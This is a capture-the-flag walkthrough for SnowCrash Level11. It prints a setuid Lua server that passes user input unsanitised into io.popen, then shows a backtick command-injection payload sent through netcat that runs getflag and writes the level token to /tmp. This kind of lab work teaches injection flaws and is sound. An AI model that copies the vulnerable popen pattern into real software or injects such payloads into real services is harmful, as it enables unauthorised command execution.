# Level11

## Hint

Perhaps you could exploit the `hash` function.

## Answer

Let's check our current directory:
```
level11@SnowCrash:~$ ll
total 16
dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 ./
d--x--x--x  1 root    users    340 Aug 30  2015 ../
-r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout*
-r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc*
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua*
-r-x------  1 level11 level11  675 Apr  3  2012 .profile*
```

Let's first read the contents of the `level11.lua` file:
```lua
level11@SnowCrash:~$ cat level11.lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

Alright seems like there is will be a server on port 5151, furthermore it will ask for a password when we try to connect, let's run it first:
```
level11@SnowCrash:~$ ./level11.lua
lua: ./level11.lua:3: address already in use
stack traceback:
        [C]: in function 'assert'
        ./level11.lua:3: in main chunk
        [C]: ?
```

Seems like the server is already running, let's connect to it using `netcat`:
```
level11@SnowCrash:~$ nc localhost 5151
Password: test
Erf nope..
```

From the code we can see that it will check if the password is equal to the hash: `f05d1d066fb246efe0c6f7d095f909a7a0cf34a0`, however getting the password correct just prints a different string so there is not point in reversing the hash. We notice that the `hash` function is executing a bash command and that our input is being sent to it as a command line argument. Therefore we can exploit it:
```
level11@SnowCrash:~$ nc localhost 5151
Password: `getflag > /tmp/flag`
Erf nope..
level11@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

Simple as that !
